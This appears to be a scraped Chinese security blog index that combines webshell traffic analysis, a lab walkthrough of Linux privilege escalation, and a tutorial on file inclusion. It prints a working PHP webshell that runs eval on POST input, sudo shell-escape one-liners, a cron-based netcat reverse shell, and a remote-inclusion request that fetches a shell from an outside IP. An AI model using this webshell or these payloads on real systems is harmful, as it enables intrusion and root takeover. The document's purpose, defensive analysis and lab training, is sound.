3Mn1yNMtoZViV5wotQHPJtwwj0F4b2lyToNK7LfdUnN7zmyQFfx/zaiGwUHg+8SlRr5QAWVdopiiVczjpFLjyU6RAwyoJGgtn557dToKwwo/7Pwvfbbo3ZplI40L++SawBYFYdic+roWObO9rbonnTa52P57V8OwUz1prlDUDt+THFdB5WpncCk+BiuxlboH7qqJnVE3JMr0DeNu7VXBx6iiHu2RrygSV59R9qIfF7kjJYzLv7Ubm4Bbif2pwZx0xaQu4wUflodDw4g6klKIyGvd1Y28S38chVY4FxrH3v7Cbi+CBUchBXvu9yyb8fAnfmdcOM2CQMB+Jc6+N426wp1VmN4M3SnXgdwF7YseNwOJy7Zf4STFcxcco5ADw3jV7s1cQHXVSIoLY3Z7JeHezM7pBRCIPu4q18lAlje9iNBkZix102OYs1Q9XjhXkLeMVO0CmlPrAmOp2gqmG2xVg0MPVP4yR1a3wwnsYbc7pBRCgIfWClY7xM3KdTN0qVzeijxyoWetK9aTSe+xZK190gvKWEQu/QS1nlLHOPkKQwVi02T/9lHdH5FpBTn6Eo7+iMEo4qw/aN/jAT90Tw8wxLmMgczMINs0YTOf6D/ziJW22emYUMJ5E6Ni9yDeFJn/cUP8P6J9ojI3LdTDjgtNm99SMoa2sGIBCzzhZ6xldzCSLf.................................... HTTP/1.1 200 OK Date: Wed, 18 Jun 2025 12:29:49 GMT Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 X-Powered-By: PHP/7.3.4 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Keep-Alive: timeout=5, max=97 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 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 4.3.冰蝎4\u0026mdash;Php\u0026mdash;自定义流量特征 默认情况下冰蝎4的流量特征和3一样，所以这边我们选择测自定义流量特征\n默认下采用的是冰蝎3的内部加密，在你连接的时候告诉你了，选择自定义模式不能用冰蝎自带的木马否则无法连接成功，如果想要使用自定义协议，需要先在传输协议中选择对应协议，然后点击生成服务端，将新生成的木马上传至服务器\nXOR_BASE64流量特征如下，和默认差不多，都没有什么明显特征，只是更能看出是经过base64编码后的\n4.4.冰蝎4\u0026mdash;JSP\u0026mdash;自定义流量特征 JSP也是默认情况下和3.0流量特征一致\n总体而言：冰蝎流量传输隐蔽性在当前主流WebShell中较高，没有明显强特征，都是弱特征\n连接通信端口号从49700起递增 请求头字段带Cookie字段，内容一般为PhpSessionID 请求体内容完全加密，主要采用AES+BASE64 返回包也完全加密 5.天蝎流量特征 天蝎的使用，也是类似于冰蝎，将本地文件的shell上传至服务器端，默认连接密码为sky\n先看请求头：天蝎每次连接都会在请求头中添加一个XFF字段，并且值是随机的，Content-Type类型为application/octet-stream，连接为长连接，请求体和返回内容都是AES加密的，无明显特征\n6.冰蝎流量解密 https://github.com/intbjw/webshell-decryptor 一款开源解密冰蝎流量工具\n冰蝎流量解密最重要的一步是需要知道冰蝎的key，如果不知道key那么是不可能解密成功的。\n获取key的几个方法：\n默认key为rebeyond md5的前16位 如果能拿到攻击者上传的webshell文件，可以查看源代码进行分析获取key值 看冰蝎后门是怎么传来到，如果是通过文件上传漏洞上传上来的，可以从全流量中获取上传数据包拿到key值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //冰蝎4.0的异或php木马 \u0026lt;?php @error_reporting(0); function Decrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; $bs=\u0026#34;base64_\u0026#34;.\u0026#34;decode\u0026#34;; $after=$bs($data.\u0026#34;\u0026#34;); for($i=0;$i\u0026lt;strlen($after);$i++) { $after[$i] = $after[$i]^$key[$i+1\u0026amp;15]; } return $after; } $post=Decrypt(file_get_contents(\u0026#34;php://input\u0026#34;)); @eval($post); ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //只需要将上传的加密脚本下载下来，将流量包内容放到下面Content中 \u0026lt;?php @error_reporting(0); function Decrypt($data) { $key=\u0026#34;e45e329feb5d925b\u0026#34;; $bs=\u0026#34;base64_\u0026#34;.\u0026#34;decode\u0026#34;; $after=$bs($data.\u0026#34;\u0026#34;); for($i=0;$i\u0026lt;strlen($after);$i++) { $after[$i] = $after[$i]^$key[$i+1\u0026amp;15]; } return $after; } //$post=Decrypt(file_get_contents(\u0026#34;php://input\u0026#34;)); $Content= \u0026#34;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\u0026#34;; $post=Decrypt($Content); var_dump($post); //@eval($post); ?\u0026gt; 运行这个脚本，会生成一段base64的值拿去解密，$cmd中的内容就是攻击者具体执行的命令\n使用abc大佬写的蓝队辅助分析工具箱工具进行解密\n项目地址：https://github.com/abc123info/BlueTeamTools\n将加密的请求包内容使用工具进行解密即可查看源码\n","date":"2025-06-18T23:50:28+08:00","image":"https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/logo_hu_c814cee1469a1eac.jpeg","permalink":"https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","title":"Webshell流量分析"},{"content":"靶机下载地址：https://download.vulnhub.com/linsecurity/lin.security_v1.0.ova\nlin.security_v1.0靶机-CSDN博客\n1 2 3 4 # 使用命令 bob/secret ssh bob@192.168.145.174 1.主机基本信息收集 1 2 3 4 5 id whoami uname -a //查看内核版本信息 cat /etc/passwd //查看主机用户 sudo -l //显示允许当前用户使用的命令 1 2 3 4 5 6 7 8 9 bob@linsecurity:~$ sudo -l [sudo] password for bob: Matching Defaults entries for bob on linsecurity: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User bob may run the following commands on linsecurity: (ALL) /bin/ash, /usr/bin/awk, /bin/bash, /bin/sh, /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed, /usr/bin/env, /usr/bin/expect, /usr/bin/find, /usr/bin/ftp, /usr/bin/less, /usr/bin/man, /bin/more, /usr/bin/scp, /usr/bin/socat, /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh, /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl, /usr/bin/tclsh, /usr/bin/git, /usr/bin/script, /usr/bin/scp 发现以上命令可以使用sudo权限\n通过该网址进行搜索哪些可以使用sudo进行提权\nhttps://gtfobins.github.io/#ash\n2.Sudo类提权 2.1.ash提权 1 sudo ash 2.2.awk提权 1 sudo awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39; 2.3.bash提权\n1 sudo bash 2.4.csh提权 1 sudo csh 2.5.dash提权 1 sudo dash 2.6.ed提权 1 2 sudo ed !/bin/bash 2.7.env提权 1 sudo env /bin/bash 2.8.expect提权 1 sudo expect -c \u0026#39;spawn /bin/sh;interact\u0026#39; 2.9.find提权 1 sudo find . -exec /bin/sh \\; -quit 2.10.ftp提权 1 2 sudo ftp !/bin/bash 2.11.less/more提权 1 2 3 4 5 sudo less /etc/profile !/bin/bash TERM= sudo more /etc/profile !/bin/sh 2.12.man提权 1 sudo man man 2.13.SCP提权 1 2 3 4 bob@linsecurity:~$ TF=$(mktemp) bob@linsecurity:~$ echo \u0026#39;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39; \u0026gt; $TF bob@linsecurity:~$ chmod +x \u0026#34;$TF\u0026#34; bob@linsecurity:~$ sudo scp -S $TF x y: 2.14.socat提权 1 sudo socat stdin exec:/bin/sh 2.15.ssh权限提升 1 sudo ssh -o ProxyCommand=\u0026#39;;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39; x 2.16.vi权限提升 1 sudo vi -c \u0026#39;:!/bin/sh\u0026#39; /dev/null 2.17.zsh权限提升 1 sudo zsh 2.18.perl提权 1 sudo perl -e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; 2.19.tclsh提权 1 2 3 # 使用命令 # sudo tclsh # exec /bin/sh \u0026lt;@stdin \u0026gt;@stdout 2\u0026gt;@stderr 2.20.git提权 1 2 3 # 使用命令 # sudo git -p help config # !/bin/sh 2.21.script提权 1 2 # 使用命令 # sudo script -q /dev/null 3.SUID提权 3.1.taskset提权 1 taskset 1 /bin/bash -p 4.计划任务提权 原理：****提权的原理为计划任务以root权限运行，计划任务中的脚本其他用户有写入的权限，或者脚本所属组为其他用户，则可以进行计划任务提权。\n1 2 crontab -l //查看当前用户的计划任务 cat /etc/crontab //查看服务器所有用户的计划任务 1 2 //每分钟以root权限执行/etc/cron.daily目录下的backup脚本 */1 * * * * root /etc/cron.daily/backup 如果当前低权限用户有权限修改这个backup脚本，那么就可以写个反弹shell命令，计划任务每分钟就会以root权限反弹shell到本机实现权限提升\n1 msfvenom -p cmd/unix/reverse_netcat lhost=192.168.165.31 lport=9999 R 1 2 3 4 5 6 7 8 # 使用命令 # echo \u0026#34;mkfifo /tmp/htukkim; nc 192.168.165.31 9999 0\u0026lt;/tmp/htukkim | /bin/sh \u0026gt;/tmp/htukkim 2\u0026gt;\u0026amp;1; rm /tmp/htukkim\u0026#34; \u0026gt; shell.sh \u0026amp;\u0026amp; chmod +x shell.sh # echo \u0026gt; \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34; # echo \u0026gt; \u0026#34;--checkpoint=1\u0026#34; # nc -lvnp 9999 此时成功接收到root用户的反弹shell会话\n1 AzER3pBZh6WZE ===\u0026gt; P@ssw0rd 5.内核提权漏洞 1 use linux/local/cve_2021_4034_pwnkit_lpe_pkexec ","date":"2025-06-17T22:10:47+08:00","image":"https://lserein.github.io/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/logo_hu_4c610baf6ac885a6.png","permalink":"https://lserein.github.io/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/","title":"Linux提权靶机lin.security"},{"content":"读取文件与下载文件在代码审计有何区别呢？\n1 2 3 4 5 实际上在后端大多是通过读取文件方式获得目标文件内容，这个不难理解。最后将文件流内容传给浏览器， 并在 header 头中添加浏览器解析方式和文件名，比如：文件下载到本地实现方法 可以使用响应头 Content-disposition 来控制，也就是说下载这个动作是交给浏览器去操作的。 Content-Disposition 响应头：指示回复的内容该以何种形式展示，是以 内联 的形式（即网页或者页 面的一部分），还是以 附件 的形式下载并保存到本地。 文件包含漏洞(详解)\n漏洞原理 其实原理就是由于在代码开发的过程中，有时候会遇到相同的代码，不想重复输入，就将代码单独写在一个文件里面，当遇到的时候就直接调用该文件进行运行，而这种方式就会导致客户端可以调用其他的恶意文件，通过恶意文件造成文件包含漏洞。\nPhp中文件包含函数 在php中文件包含漏洞包含的任何文件都可作为php执行\n1 2 3 4 5 6 7 8 9 10 文件包含漏洞在PHP中是比较多的，像JSP、ASP这方面的漏洞是比较少的，但这并不是说就不存在。 include：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。 include_once：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。 require：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。 require_once：和 require 类似，不同处在于 require_once 只导入一次。 fopen(): readfile(): Java/Servlet : java.io.File(),java.io.FileReader() asp:include file,include virtual 本地文件包含与远程文件包含 本地文件包含 1 2 3 4 \u0026lt;?php $filename=$_GET[name]; include($filename); ?\u0026gt; 远程文件包含 远程文件包含漏洞导致的原因和本地文件包含漏洞造成的原因是一样的，只不过远程文件包含漏洞是利用外部的服务器中的文件进行执行，就形成了远程文件包含漏洞。\n但是前提是需要在php.ini中的配置选项中allow_url_fopen和allow_url_include为ON。\n如果能够获取到目标服务器的phpinfo()文件，也可以进行查看\n先查看是否能包含网页文件如百度\n1 http://sandbox.ctfhub.com:10800/index.php?file=https://www.baidu.com 远程包含一句话木马文件实现getshell\n1 2 3 4 5 6 7 8 9 10 11 12 13 POST /index.php?file=http://47.76.47.203:8000/shell.txt HTTP/1.1 Host: challenge-2417f8bb116a62b9.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Referer: http://challenge-2417f8bb116a62b9.sandbox.ctfhub.com:10800/ Priority: u=6 Content-Type: application/x-www-form-urlencoded Content-Length: 24 cmd=system(\u0026#39;cat /flag\u0026#39;); 文件包含伪协议利用 1 2 3 4 5 6 7 8 9 file:// #访问本地文件系统 http:// #访问HTTPs网址 ftp:// #访问ftp URL php:// #访问输入输出流 zlib:// #压缩流 data:// #数据 ssh2:// #security shell2 expect:// #处理交互式的流 glob:// #查找匹配的文件路径 1.file伪协议 2.php:// 输入输出流 也和权限挂钩，只能读apache用户可读的内容\n条件：只是读取，需要开启 allow_**url**fopen，不需要开启 allow**url**_include\nPHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://filter（本地磁盘文件进行读取）元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。\n1 2 3 4 5 6 7 8 9 GET /index.php?file=php://filter/convert.base64-encode/resource=/flag HTTP/1.1 Host: challenge-064b3e5b3e558d07.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, 